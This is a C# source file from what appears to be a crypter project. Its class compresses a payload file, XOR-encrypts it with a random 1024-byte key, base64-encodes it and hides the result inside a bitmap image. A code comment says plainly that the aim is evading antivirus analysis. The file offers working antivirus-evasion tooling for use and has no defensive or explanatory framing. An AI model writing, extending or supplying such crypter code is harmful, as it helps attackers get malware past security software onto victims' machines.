using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace managedcrypter.IO
{

    class GenericFile
    {
        public GenericFile()
        {
            setEncryptionKey();
        }

        public GenericFile(string filePath, bool bCompress)
        {
            OriginalFileData = File.ReadAllBytes(filePath);

            if (bCompress)
                OriginalFileData = QuickLZ.compress(OriginalFileData, 3);

            setEncryptionKey();
        }

        public GenericFile(byte[] fileData)
        {
            OriginalFileData = fileData;

            setEncryptionKey();
        }

        public byte[] OriginalFileData { get; private set; }
        public byte[] EncryptedData { get; private set; }
        public byte[] EncodedData { get; private set; }
        public byte[] EncryptionKey { get; private set; }
        public byte[] StenographedData { get; private set; }

        public void EncryptData()
        {
            EncryptedData = xorEncryptDecrypt(OriginalFileData, EncryptionKey);
        }

        public void EncodeData()
        {
            EncodedData = new ASCIIEncoding().GetBytes(Convert.ToBase64String(EncryptedData));
        }

        public void StenographData()
        {
            ImageConverter iConverter = new ImageConverter();
            StenographedData = iConverter.ConvertTo(BitmapDataStorage.CreateBitmapFromData(EncodedData), typeof(byte[])) as byte[];
        }

#if DEBUG
        public bool SanityCheck()
        {
            byte[] buff = new byte[OriginalFileData.Length];
            buff = Convert.FromBase64String(new ASCIIEncoding().GetString(EncodedData));
            buff = xorEncryptDecrypt(buff, EncryptionKey);
            return buff.SequenceEqual(OriginalFileData);
        }
#endif

        /* The reason I use such a big key is to prevent "extraction"
                ex: if I were to use a 16 byte (128 bit) key
                and were to xor encrypt a series of 16 zeros,
                then that would leave the key visible very easily,
                with a 1024 byte key this prevents that from happening
                in many cases...BTW the algo isn't meant to be secure
                at all, it doesn't need to be - we are evading AV 
                analysis not reverse engineers :) */

        void setEncryptionKey()
        {
            Random R = new Random(Guid.NewGuid().GetHashCode());
            byte[] Key = new byte[1024];
            R.NextBytes(Key);
            EncryptionKey = Key;
        }

        byte[] xorEncryptDecrypt(byte[] array, byte[] key)
        {
            byte[] ret = new byte[array.Length];
            array.CopyTo(ret, 0);

            for (int i = 0; i < ret.Length; i++)
                ret[i] ^= key[i % key.Length];

            return ret;
        }
    }
}
